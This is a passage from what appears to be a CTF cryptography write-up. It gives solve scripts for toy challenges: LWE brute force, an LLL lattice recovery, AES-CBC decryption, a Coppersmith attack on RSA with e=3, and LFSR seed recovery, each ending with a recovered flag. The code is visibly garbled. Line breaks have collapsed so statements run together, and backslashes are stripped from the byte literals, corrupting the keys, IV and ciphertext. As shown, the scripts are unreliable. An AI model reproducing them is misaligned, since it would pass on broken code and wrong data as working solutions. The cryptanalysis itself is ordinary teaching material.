76, 97], [22, 115, 20, 67], [40, 72, 110, 65], [111, 92, 106, 117], [5, 123, 21, 96], [41, 14, 23, 114], [113, 75, 43, 65], [56, 3, 61, 48], [40, 101, 16, 114], [42, 84, 95, 13], [36, 110, 91, 107], [4, 13, 60, 74], [24, 80, 125, 76], [123, 26, 27, 119], [31, 87, 6, 123], [61, 106, 73, 120], [66, 10, 36, 65], [91, 38, 46, 9], [121, 20, 106, 48], [123, 21, 78, 27], [22, 74, 55, 110], [47, 49, 118, 76], [30, 10, 16, 118], [43, 19, 52, 61], [100, 9, 37, 35], [20, 102, 111, 94], [116, 63, 55, 43], [13, 110, 42, 14], [46, 65, 71, 28], [82, 5, 76, 74], [86, 34, 117, 84], [28, 44, 82, 50], [76, 79, 77, 11], [68, 39, 51, 89], [83, 93, 95, 2], [54, 108, 101, 82], [99, 90, 122, 37], [16, 92, 79, 12], [67, 86, 24, 36], [80, 94, 106, 59], [50, 56, 95, 98], [33, 68, 89, 40], [74, 124, 14, 82], [88, 93, 54, 93], [51, 17, 124, 31], [17, 17, 45, 35], [113, 71, 76, 44], [48, 6, 120, 4], [36, 91, 108, 11], [2, 41, 58, 72], [42, 59, 51, 81], [73, 22, 79, 27], [85, 35, 29, 98], [76, 76, 37, 22], [82, 29, 42, 27], [75, 114, 37, 106], [40, 69, 53, 73], [39, 44, 33, 121], [94, 85, 92, 54], [91, 77, 124, 46], [108, 31, 101, 84], [35, 33, 97, 45], [99, 32, 17, 14], [1, 66, 11, 35], [78, 100, 95, 81], [73, 49, 14, 37], [70, 9, 107, 2], [84, 98, 92, 62], [123, 87, 87, 110], [3, 81, 111, 28], [20, 2, 91, 37], [93, 101, 77, 93], [27, 16, 31, 105], [95, 81, 87, 17], [10, 103, 21, 102], [81, 57, 118, 82], [15, 92, 60, 71], [16, 84, 126, 49], [35, 26, 2, 120], [70, 86, 45, 9], [29, 8, 40, 66], [99, 77, 14, 9], [12, 70, 50, 52], [21, 21, 85, 54], [91, 94, 100, 85], [9, 42, 47, 14], [117, 55, 17, 99], [53, 45, 4, 72], [49, 10, 27, 121], [108, 61, 73, 42], [121, 42, 41, 71], [49, 63, 50, 117], [5, 78, 24, 101], [0, 117, 21, 46], [90, 43, 47, 32], [74, 85, 118, 84], [13, 73, 18, 66], [95, 24, 120, 18], [94, 21, 111, 34], [66, 68, 80, 21], [102, 49, 57, 55], [25, 85, 107, 98], [8, 18, 88, 12], [18, 6, 86, 82], [18, 91, 126, 115], [26, 11, 30, 35], [88, 78, 76, 74], [51, 75, 76, 15], [60, 24, 72, 27], [91, 72, 44, 104], [84, 113, 39, 116], [41, 83, 91, 74], [84, 17, 94, 119], [46, 95, 85, 5], [109, 58, 71, 42], [126, 29, 114, 73], [27, 70, 7, 125], [121, 66, 97, 111], [8, 21, 10, 57], [15, 62, 65, 8], [101, 79, 32, 74], [69, 42, 38, 58], [65, 81, 72, 16], [20, 81, 1, 126], [91, 111, 69, 33], [56, 84, 65, 66], [47, 78, 43, 100], [43, 90, 80, 25], [46, 55, 10, 60], [116, 110, 49, 116], [72, 115, 38, 104], [79, 43, 74, 106], [86, 113, 84, 76], [102, 2, 119, 3], [126, 25, 83, 44], [37, 83, 46, 40], [13, 75, 101, 101], [76, 93, 3, 63], [69, 9, 84, 37], [103, 47, 106, 80], [72, 104, 85, 19], [124, 118, 34, 81], [57, 25, 52, 119], [44, 56, 63, 90], [123, 46, 124, 31], [19, 116, 23, 77], [126, 78, 37, 93], [34, 95, 43, 98], [37, 90, 32, 97], [106, 8, 80, 8], [90, 5, 113, 68], [99, 40, 39, 18], [90, 37, 48, 45], [56, 13, 76, 6], [68, 33, 52, 102], [62, 45, 29, 123], [100, 21, 73, 92], [92, 18, 118, 23], [84, 86, 42, 83], [107, 8, 71, 52], [114, 106, 78, 85], [10, 120, 115, 119], [27, 49, 124, 16], [65, 40, 48, 37], [69, 42, 8, 29], [35, 39, 55, 102], [58, 19, 41, 75], [17, 2, 113, 12], [8, 34, 72, 75], [91, 32, 19, 52], [62, 50, 109, 78], [9, 115, 35, 50], [42, 83, 78, 41], [34, 94, 97, 58], [56, 73, 25, 115], [55, 12, 16, 86], [97, 95, 30, 92], [47, 105, 70, 68], [50, 18, 51, 23], [46, 57, 80, 29], [4, 66, 123, 24], [55, 53, 26, 36], [71, 59, 104, 91], [94, 3, 1, 34], [57, 8, 85, 102], [89, 73, 115, 25], [13, 38, 81, 76], [104, 30, 81, 104], [55, 101, 95, 101], [69, 65, 5, 11], [123, 105, 84, 125], [38, 110, 4, 28], [112, 115, 92, 71], [90, 120, 112, 39], [50, 18, 107, 71], [95, 63, 118, 93], [93, 111, 59, 55], [17, 15, 2, 88], [78, 126, 37, 12], [56, 112, 53, 12], [65, 34, 82, 100], [9, 94, 72, 99], [78, 76, 43, 91], [7, 88, 107, 31], [43, 91, 97, 4], [113, 112, 36, 15], [8, 97, 23, 84], [65, 92, 31, 63], [54, 38, 119, 103], [89, 50, 57, 50], [61, 37, 87, 0], [21, 35, 44, 22], [20, 32, 95, 116], [10, 94, 103, 84], [59, 29, 7, 50], [98, 33, 87, 33], [7, 96, 36, 67], [85, 10, 35, 98], [65, 49, 19, 62], [56, 67, 14, 91], [30, 49, 111, 77], [121, 49, 108, 119], [89, 67, 115, 69], [65, 8, 0, 82], [117, 57, 117, 23], [23, 38, 2, 98], [60, 28, 94, 93], [23, 65, 8, 114], [121, 105, 122, 40], [120, 12, 21, 112], [55, 51, 2, 77], [48, 41, 113, 62], [66, 82, 117, 119], [4, 15, 5, 21], [41, 14, 12, 80], [23, 61, 106, 16], [23, 53, 122, 68], [6, 54, 5, 101], [69, 49, 7, 79], [17, 70, 64, 88], [103, 30, 76, 31], [108, 82, 90, 109], [55, 56, 113, 37], [93, 99, 126, 44], [1, 46, 105, 124], [55, 54, 35, 115], [0, 89, 53, 97], [67, 111, 107, 80], [92, 122, 40, 64], [75, 2, 126, 118], [90, 84, 43, 74], [101, 69, 60, 17], [104, 10, 4, 122], [94, 4, 115, 91], [15, 11, 111, 105], [9, 7, 32, 101], [77, 18, 55, 56], [66, 7, 117, 108], [116, 121, 33, 66], [32, 41, 83, 125], [60, 52, 70, 58], [125, 54, 93, 15], [70, 19, 10, 58], [83, 94, 61, 126], [95, 85, 80, 44], [25, 89, 117, 74], [12, 17, 63, 87], [118, 80, 96, 26], [6, 97, 79, 38], [97, 3, 107, 95], [7, 82, 106, 92], [83, 100, 119, 95], [81, 26, 99, 56], [25, 60, 51, 122], [56, 18, 22, 84], [9, 72, 107, 114], [80, 97, 92, 52], [108, 47, 58, 46], [9, 47, 7, 47], [115, 68, 91, 7], [14, 120, 87, 122], [97, 15, 40, 79], [5, 92, 85, 93], [4, 97, 73, 63], [25, 22, 92, 108], [88, 4, 34, 86], [0, 43, 21, 57], [67, 90, 36, 50], [15, 126, 37, 12], [92, 73, 96, 71], [76, 107, 27, 115], [79, 8, 68, 55], [38, 12, 120, 126], [54, 46, 7, 69], [72, 114, 93, 60], [59, 98, 27, 102], [50, 76, 87, 19], [77, 107, 29, 40], [36, 73, 21, 123], [36, 89, 82, 74], [24, 73, 118, 86], [58, 89, 115, 106], [12, 27, 33, 72], [28, 94, 21, 26], [0, 79, 48, 110], [72, 62, 82, 57], [65, 84, 114, 97], [80, 68, 52, 52], [119, 35, 103, 101], [10, 67, 68, 69], [101, 17, 54, 40], [98, 46, 21, 42], [30, 39, 56, 118], [27, 33, 77, 114], [66, 74, 61, 63], [23, 13, 14, 47], [88, 30, 122, 119], [15, 58, 55, 52], [56, 27, 47, 45], [119, 95, 59, 14], [84, 69, 5, 83], [21, 35, 39, 36], [10, 92, 68, 17], [79, 67, 111, 38], [36, 1, 4, 117], [117, 30, 5, 7], [112, 15, 115, 123], [54, 47, 18, 93], [102, 111, 3, 68], [91, 91, 5, 44], [123, 118, 57, 32], [12, 121, 31, 103], [114, 52, 105, 12], [100, 28, 117, 102], [51, 42, 12, 124], [47, 1, 42, 47], [28, 3, 22, 100], [103, 105, 119, 24], [101, 59, 13, 78], [79, 36, 61, 54], [11, 46, 75, 116], [31, 73, 118, 0], [92, 32, 0, 124], [77, 85, 25, 90], [29, 21, 74, 7], [3, 66, 11, 8], [112, 91, 50, 53], [45, 113, 99, 123], [35, 65, 85, 22], [108, 99, 42, 1], [103, 113, 116, 72], [125, 74, 112, 24], [75, 79, 80, 12], [83, 44, 94, 86], [64, 20, 0, 8], [104, 126, 31, 120], [85, 75, 61, 74], [36, 93, 36, 102], [70, 54, 101, 83], [90, 46, 109, 83], [112, 126, 114, 23], [16, 123, 97, 62], [118, 86, 108, 53], [99, 18, 2, 18], [103, 3, 38, 8], [99, 49, 123, 81], [37, 75, 89, 53], [34, 77, 27, 122], [29, 8, 40, 66], [119, 13, 64, 83], [4, 108, 116, 121], [49, 87, 1, 92], [15, 63, 80, 62], [27, 81, 100, 83], [7, 90, 16, 0], [13, 50, 61, 65], [51, 64, 76, 5], [55, 100, 106, 66], [52, 102, 105, 2], [49, 34, 89, 116], [24, 55, 11, 27], [91, 48, 73, 38], [27, 5, 1, 126], [66, 55, 80, 19], [52, 118, 104, 43], [36, 1, 111, 60], [65, 4, 34, 17], [54, 22, 0, 39], [52, 30, 64, 62], [26, 40, 32, 86], [93, 71, 41, 47], [77, 23, 15, 9], [11, 20, 51, 31], [64, 50, 37, 50], [17, 49, 80, 37], [119, 115, 115, 50], [20, 86, 27, 5], [101, 65, 17, 78], [56, 25, 125, 56], [16, 118, 2, 96], [114, 108, 69, 121], [14, 37, 76, 101], [113, 124, 121, 82], [43, 120, 35, 94], [82, 67, 23, 43], [9, 79, 47, 122], [39, 28, 110, 31], [35, 48, 27, 16], [72, 8, 115, 66], [54, 46, 122, 19], [77, 77, 30, 74], [58, 63, 81, 96], [6, 122, 75, 63], [115, 31, 119, 110], [82, 86, 89, 1], [79, 100, 6, 110], [117, 67, 15, 13], [4, 15, 63, 0], [106, 108, 122, 107], [34, 72, 0, 114], [20, 0, 32, 56], [121, 104, 66, 3], [86, 28, 76, 84], [85, 9, 60, 45], [95, 80, 78, 65], [39, 85, 50, 49], [42, 103, 36, 90], [70, 99, 116, 117], [34, 15, 40, 52], [24, 49, 19, 31], [98, 90, 95, 89], [63, 45, 40, 77], [114, 14, 30, 106], [10, 35, 116, 9], [103, 111, 112, 16], [71, 112, 71, 32], [77, 31, 105, 64], [84, 87, 24, 67], [1, 27, 123, 57], [104, 29, 87, 123], [110, 39, 67, 7], [28, 70, 108, 113], [96, 9, 101, 36], [13, 28, 6, 13], [69, 81, 89, 26], [79, 113, 77, 91], [112, 62, 104, 117], [109, 95, 55, 83], [78, 68, 98, 14], [73, 79, 96, 12], [108, 39, 97, 49], [27, 111, 106, 100], [82, 70, 9, 36], [48, 31, 90, 70], [99, 92, 45, 35], [55, 100, 31, 37], [75, 17, 69, 35], [12, 38, 119, 112], [103, 34, 63, 76], [26, 19, 91, 111], [74, 122, 12, 78], [64, 117, 16, 60], [2, 97, 122, 106], [62, 79, 56, 30], [71, 47, 13, 22], [38, 78, 116, 16], [87, 28, 94, 76], [77, 126, 94, 116], [83, 46, 104, 90], [5, 95, 13, 26], [47, 10, 46, 115], [82, 19, 91, 70], [111, 72, 49, 65], [18, 103, 59, 72], [17, 37, 56, 24], [19, 120, 24, 64], [28, 40, 11, 20], [18, 19, 80, 62], [37, 11, 74, 14], [109, 97, 75, 72], [116, 65, 52, 121], [95, 63, 82, 122], [88, 93, 54, 93], [77, 30, 65, 121], [99, 121, 42, 87], [62, 52, 44, 6], [79, 60, 55, 4], [96, 64, 6, 20], [94, 114, 90, 8], [123, 98, 29, 27], [116, 84, 31, 80], [9, 77, 45, 45], [120, 33, 63, 15], [51, 44, 66, 25], [2, 46, 72, 94], [107, 113, 50, 46], [115, 64, 126, 85], [64, 10, 28, 78], [84, 112, 64, 103], [59, 114, 15, 82], [65, 122, 104, 89], [113, 122, 21, 11], [69, 106, 19, 78], [42, 93, 125, 0], [7, 123, 82, 70], [103, 114, 62, 92], [15, 30, 78, 114], [4, 78, 111, 60], [40, 80, 34, 55], [3, 87, 120, 27], [122, 64, 3, 122], [24, 49, 31, 81], [26, 43, 100, 19], [52, 78, 2, 97], [116, 45, 15, 33], [21, 119, 92, 86], [28, 118, 71, 24], [106, 15, 0, 79], [36, 4, 52, 73], [22, 43, 8, 60], [96, 22, 9, 100], [19, 64, 26, 96], [97, 61, 22, 39], [6, 112, 76, 38], [58, 6, 97, 94], [103, 87, 87, 101], [17, 49, 80, 37], [117, 33, 26, 8], [59, 108, 78, 91], [113, 28, 30, 44], [119, 78, 72, 20], [49, 101, 77, 2], [26, 18, 35, 7], [34, 38, 99, 37], [45, 52, 90, 27], [108, 31, 118, 67], [3, 37, 29, 88], [111, 96, 12, 111], [91, 111, 106, 100], [52, 78, 117, 80], [14, 51, 87, 0], [1, 52, 116, 1], [117, 2, 33, 48], [57, 0, 48, 34], [59, 14, 84, 63], [82, 83, 8, 82], [58, 100, 32, 33], [75, 29, 112, 103], [0, 49, 45, 54], [94, 9, 51, 110], [54, 61, 27, 47], [88, 89, 23, 37], [73, 43, 0, 32], [123, 6, 35, 78], [73, 72, 119, 64], [81, 46, 11, 102], [42, 124, 47, 8], [50, 66, 3, 40], [116, 7, 51, 20], [47, 112, 99, 7], [42, 37, 86, 89], [18, 74, 78, 101], [57, 85, 75, 7], [26, 90, 35, 10], [72, 126, 10, 77], [55, 12, 5, 78], [37, 87, 85, 96], [91, 9, 114, 68], [79, 76, 44, 20], [84, 52, 63, 56], [95, 9, 22, 117], [96, 38, 50, 67], [43, 114, 45, 56], [94, 21, 74, 107], [92, 82, 81, 71], [40, 10, 10, 90], [20, 18, 15, 56], [72, 2, 30, 22], [50, 31, 123, 20], [85, 40, 115, 115], [93, 1, 48, 47], [111, 118, 45, 34], [9, 122, 37, 121], [60, 27, 77, 41], [122, 38, 22, 39], [115, 66, 74, 126], [77, 67, 90, 78], [96, 3, 53, 52], [5, 26, 120, 101], [45, 100, 72, 6], [106, 56, 87, 77], [52, 68, 102, 95], [1, 13, 36, 33], [58, 27, 35, 8], [52, 5, 38, 35], [102, 82, 63, 47], [24, 71, 119, 43], [11, 36, 90, 13], [11, 93, 27, 23], [4, 107, 26, 125], [85, 9, 5, 13], [116, 25, 55, 119], [73, 82, 73, 2], [40, 123, 77, 41], [10, 98, 51, 111], [23, 79, 120, 54], [56, 18, 22, 84], [61, 115, 51, 109], [33, 5, 12, 121], [8, 81, 35, 70], [22, 39, 103, 2], [38, 74, 66, 126], [83, 20, 117, 85], [8, 32, 91, 98], [37, 31, 94, 119], [7, 30, 45, 43], [68, 16, 124, 97], [86, 124, 37, 21], [29, 101, 15, 30], [27, 31, 52, 45], [47, 37, 102, 3], [117, 49, 54, 89], [48, 94, 126, 66], [42, 115, 63, 104], [14, 74, 6, 112], [68, 125, 4, 5], [66, 3, 78, 52], [108, 33, 6, 77], [77, 99, 16, 52], [61, 78, 73, 70], [108, 106, 124, 0], [23, 35, 119, 118], [125, 124, 37, 65], [69, 30, 61, 110], [77, 10, 120, 118], [53, 121, 24, 30], [87, 32, 29, 63], [54, 64, 1, 3], [16, 59, 104, 25], [30, 6, 59, 102], [43, 120, 35, 94], [89, 13, 69, 39], [87, 78, 100, 14], [83, 17, 14, 4], [24, 49, 31, 81], [73, 32, 72, 10], [0, 22, 61, 54], [81, 42, 70, 13], [108, 56, 52, 2], [25, 99, 116, 72], [66, 23, 18, 102], [121, 115, 47, 12], [96, 37, 123, 48], [64, 69, 4, 39], [78, 38, 124, 31], [27, 69, 10, 70], [5, 29, 2, 85], [30, 45, 56, 7], [31, 25, 120, 61], [36, 89, 89, 118], [98, 63, 18, 21], [121, 83, 36, 57], [60, 5, 86, 17], [121, 55, 117, 58], [12, 96, 4, 27], [119, 63, 124, 37], [96, 27, 45, 91], [42, 119, 8, 103], [104, 42, 68, 37], [104, 55, 41, 38], [120, 3, 50, 87], [120, 121, 20, 67], [58, 123, 50, 28], [103, 62, 58, 20], [97, 27, 89, 102], [7, 51, 56, 108], [73, 60, 10, 77], [56, 72, 103, 69], [101, 89, 18, 66], [115, 35, 80, 36], [98, 103, 39, 63], [29, 126, 67, 76], [27, 97, 15, 79], [36, 6, 17, 90], [126, 54, 101, 42], [115, 66, 74, 126], [78, 80, 62, 83], [60, 11, 31, 88], [16, 73, 108, 13]]
P = np.array(P)C = np.array(C)q = 127n = 3
P = np.array(P)C = np.array(C)b = P[:, 0].reshape(-1, 1)A = -P[:, 1:]T = []for i in range(q//2):    for j in range(q//2):        for k in range(q//2):                T.append([i,j,k])for t in T:    t = np.array(t).reshape(-1, 1)    e = (b - np.dot(A, t))%q    e = e.T.tolist()[0]    if all(i in [0,1,125,126] for i in e):        s = np.concatenate([np.ones(1, dtype=np.int32), (t.T)[0]])        break
M = (np.dot(C, s) % q).tolist()m = ''for i in M:    if i>=np.floor(2*q / 3) or i<=np.floor(q / 3):        m+='0'    else:        m+='1'print(long_to_bytes(int(m,2)))#b"Congratulations,you're amazing!Here's a hint: sin(iv) + leak * cos(iv) = 0, keep it up! @V@"
import libnumt = 3.257518803980229925210589904230583482986646342139415561576950148286382674434770529248486501793457710730252401258721482142654716015216299244487794967600132597049154513815052213387666360825101667524635777006510550117512116441539852315185793280311905620746025669520152068447372368293640072502196959919309286241a = arctan(t)ts = 2^1024
A = int(a*ts)Pi = int((pi).n(1024)*ts)
G = Matrix([[1,0,-ts],[0,1,int(Pi)],[0,0,A]])m = G.LLL()[0][0]print(m)print(libnum.n2s(int(m)))#b'?xaa =txbcxddQxac/yqx13xc3x7fxb9'
from Crypto.Cipher import AESfrom Crypto.Util.Padding import pad,unpadfrom Crypto.Util.strxor import strxoriv = b'?xaa =txbcxddQxac/yqx13xc3x7fxb9'c = b'x9fT@xbcx82x8esQx1exd8x1dxdbx9bxb4xf8rUxc8xa0xcbxaf Hxa9.x04x1exd2x92x1fx0fBja-x965xxa8@xc9xxf9xafx87xd1xa5}xfcx1bxe0#xc3mxc9x8973x1cx1fx13x8fxb2axaexa9]xb9xc2xe8x83Ax80x13gxc9ax1c<x8ax9c&xd9xbdx06xefxba9xb0x03x9fx022xc9x13x9axffXPGxc6oxc0xeaV7)XG9Lx84N7Uxe3Wn0Gx8exd3x04(nx08xb9x17xe6xf1xaaxb7x8a@$x16x13x06Ax00xc9Zxdfx7fQxc9x08xb4xf3Pxfcpexe2xebx96x0e(-xdex17xd1x01x1c_x82x8bx9fwxc8x86xfbwxb5xf7xd0xc8x1784xe3?x00x0b.)xb7xbcx8e{xe0xaex8d$x0fx19'xb6xee@dx00xd9x84x8cx0exa3,xc6axa3xba*1xfd<xfdx18xd6x9ex8c4x8e#xfdxbd&0RxeddE,xedxb6x1ex00x11xa6Kxd3x1dTx8c5x8ex00xeax10xe9'u"B#xa1#xd8xe3xf5jxbcx94Mxdaxe3xcb*xf0W1xa0x80x1dxfcxbfox01?(darxb6x86xd0x90x88Zxa1`Bx89x89x89xb3vxa5xf0xe0x0cx8excc+Pxfcxfd#x83xe9x93x96nxf2xa5xfbxc3xc5xaax9ex89x93xb6xf5xeax8c%NYxc3x0eRxfasxa1x13xf2/*xcex8b_:
_rxebxbex0bx8ax8cx97x7f|m}xaexa9Ix95xccxe7x80xa5yC4x1f5xa4Pxc5xbf.xf9Vxe8|xbbxc3xcbx98&'JBx99x94xc0r$x0bxbe48uxebxcaxa1xfbbxd8_Rx97x8exaeIxfcxc2xb2xd2#@xecx16xf1xd7eCQx1cOx13xcaxb5xd3x1axb1xf1_Dx80x06xa5xbexbevxbdxd6xbbx9axc9xx9cf:
xcb>xa2xe1xcadxde]awxa0xdcxb2xb3{+x85x8dx8bxc5rTxccxd9Xxd5x9br<x99mxb8b6sxbfpx0eo~xe9&xb2{xbexeex93xd2N1\x94x968IWO7xcbxb6ex80xf7x9airxb2~x17x1cFx0fx82T]RBXxdexx13x85xfaxcd-xcexdcxe4xe5^x99uxb5x01xd0-xc3Cxcdxc4y6xb7x9d|L1xe74xf7x8cHxe9xa9xfavnxec;xf2xa2wxfbx13_br)z!xa3xc8xa8xc2xd2x10x00x11x11rxb2&xfbx04&x84">x6l[x06n>xa0xbex9c`xa7x9exe0xfbx85x91xc4,xcfxacxe11@axed3@xfd}x8exfaTpxcb7xe7xbfxd4xe0~bxd9xe0<xbax81xd4"exfcx939|j#0Hx86xf8x0bx03xd2xe8xf5xe55xdcxc8x06\xb7)xccx9b'xf12'print(len(c))
key = b'x8fjx94x98-x1fdxd5x89xbexa9*Tux90xb7'

cipher = AES.new(key=key, iv=iv, mode=AES.MODE_CBC)
decrypted_bytes = cipher.decrypt(c)
chunk_size = 16chunks = [decrypted_bytes[i:i + chunk_size] for i in range(0, len(decrypted_bytes), chunk_size)]
flag = ""for chunk in chunks:    unpadded_chunk = unpad(chunk, 16)    flag += unpadded_chunk.decode()
print("解密后的 flag:", flag)#'flag{6ef25d1e-bb76-8e53-dbc4-1e56585f9aa9}'
from Crypto.Util.number import *import gmpy2flag = b'flag{fake_flag}'assert len(flag) == 39p = getPrime(512)q = getPrime(512)n = p * qe = 0x3pad1 = b'easy_problem'pad2 = b'How_to_solve_it'c = pow(bytes_to_long(pad1 + flag + pad2),e,n)print(f'n = {n}')print(f'c = {c}')
'''n = 130210658110511504736422597261591182174531847806532340762131145212035478695205314931974421838392310731226415266775095601890938846830080329061111533796518633011922277343217149648494987341818402753017296362015915834670450122261511337212801488239810623226740266516836721952886027130703886460578247562781194524199c = 58274335440051115211211273605191310114692293785750437685473044454042062899661976407492451518086227780147882738264722645944582899451063113444881286175099872016956825274378613983870549046907444680021237171113596116147511706486372974792692071549068969896395366667516390709069131700584308236332248449116109156503'''
import libnum

n = 130210658110511504736422597261591182174531847806532340762131145212035478695205314931974421838392310731226415266775095601890938846830080329061111533796518633011922277343217149648494987341818402753017296362015915834670450122261511337212801488239810623226740266516836721952886027130703886460578247562781194524199c = 58274335440051115211211273605191310114692293785750437685473044454042062899661976407492451518086227780147882738264722645944582899451063113444881286175099872016956825274378613983870549046907444680021237171113596116147511706486372974792692071549068969896395366667516390709069131700584308236332248449116109156503e = 0x3pad1 = b'easy_problem'pad2 = b'How_to_solve_it'PR.<x> = PolynomialRing(Zmod(n))f = (libnum.s2n(pad1)*256**(39+len(pad2)) + x * 256 ** len(pad2) + libnum.s2n(pad2)) ** e - cf = f.monic()root = f.small_roots(X=2 ** (39 * 8),beta=0.9,epsilon=0.03)print(root)print(libnum.n2s(int(root[0])))
    #b'flag{A_C0pper5mi1tH_4Ues7iOn_SplIt_Pad}'
classGen:    def __init__(self, state):        self.nbits = 128        self.state = state & ((1 << self.nbits) - 1)        self.mask = 109908700282042807039366676242995409413

    def func0(self, steps=1):        for _ in range(steps):            res = self.state & self.mask            bit = sum([(res >> i) & 1for i in range(self.nbits)]) & 1            self.state = ((self.state << 1) ^ bit) & ((1 << self.nbits) - 1)        return bit
    def __next__(self):        out = 0        for _ in range(8):            bit = self.func0(2023)            out = (out << 1) ^ bit        return out
#!/usr/bin/env python
import os, utilsfrom secret import flagassert flag.startswith(b'flag{') and flag.endswith(b'}')
seed = int(os.urandom(16).hex(), 16)gen = utils.Gen(seed)msg = b'Happy4321: ' + flagenc = bytes(m ^ next(gen) for m in msg).hex()print(enc)
# cd1dd7c7a9cfe3c0067ff64694e64c38aa759c81d1c8f48cf6f7ee1df2d1e58584da52644ea56bd24dadca6bd5a6899a92b118f57de2529670264d48
nbits=128enc='cd1dd7c7a9cfe3c0067ff64694e64c38aa759c81d1c8f48cf6f7ee1df2d1e58584da52644ea56bd24dadca6bd5a6899a92b118f57de2529670264d48'enc=bytes.fromhex(enc)
part_flag=b'Happy4321: flag{'table = zip(part_flag,enc[:16])         #flag每位字符和密文对位异或endstate = [i^^j for i,j in table]     # 末态#print(endstate)enc=(bytes(endstate))#print(enc)t = []for i in range(16):    t.append(bin(enc[i])[2:].zfill(8))
leak = []for i in t:    for j in i:        leak.append(int(j))#print(leak)
def solve_leak(mask, leak):
    C = matrix(GF(2), nbits, nbits)    for i in range(nbits-1):        C[i+1, i] = 1    for i in range(nbits):        C[i, -1] = mask[i]
    M = list()    for i in range(nbits):      M += [(C^(2023*(i+1))).T[-1].list()]
    res = (vector(GF(2), leak) / matrix(GF(2), M).T).list()    seed = int(''.join(str(_) for _ in res), 2)    return seed
mask=109908700282042807039366676242995409413mask=[int(bit) for bit in bin(mask)[2:].rjust(128,'0')]seed=solve_leak(mask,leak)print("seed=",seed)
    #seed= 16527323701539137374460041583215952894
classGen:    def __init__(self, state):        self.nbits = 128        self.state = state & ((1 << self.nbits) - 1)        self.mask = 109908700282042807039366676242995409413

    def func0(self, steps=1):        for _ in range(steps):            res = self.state & self.mask            bit = sum([(res >> i) & 1for i in range(self.nbits)]) & 1            self.state = ((self.state << 1) ^ bit) & ((1 << self.nbits) - 1)        return bit
    def __next__(self):        out = 0        for _ in range(8):            bit = self.func0(2023)            out = (out << 1) ^ bit        return out
enc ='cd1dd7c7a9cfe3c0067ff64694e64c38aa759c81d1c8f48cf6f7ee1df2d1e58584da52644ea56bd24dadca6bd5a6899a92b118f57de2529670264d48'mask = 109908700282042807039366676242995409413seed = 16527323701539137374460041583215952894gen = Gen(seed)
enc= bytes.fromhex(enc)flag = bytes(m ^ next(gen) for m in enc)print(flag)#b'Happy4321: flag{The_matrix_is_as_charming_as_the_starry_sky}'
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748229263-wxsync-2025-05-af02af578f3b4dae5e8a3ec241a1e50f.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748229266-wxsync-2025-05-e205943c7fb64ad3650c59548b212bba.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748229268-wxsync-2025-05-86de4d725992493339bb246b096b6bf0.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748229271-wxsync-2025-05-d4b033f6796cb438b9310480a443b718.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748229274-wxsync-2025-05-a6a009cb9370c53fbb2340289179bda2.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748229278-wxsync-2025-05-aacf0a4d1fd24fbdda778ed17cddff18.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748229280-wxsync-2025-05-e6d3daa16921a1ee3fb1337fe8886bb9.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748229284-wxsync-2025-05-ccf4d579ab0f20ef31c0f5e263bb6642.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748229286-wxsync-2025-05-8af1eb082630ce92bb4126f6648cfc90.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748229289-wxsync-2025-05-ce88ff735b5e2f3db7b9df4e9875649c.png)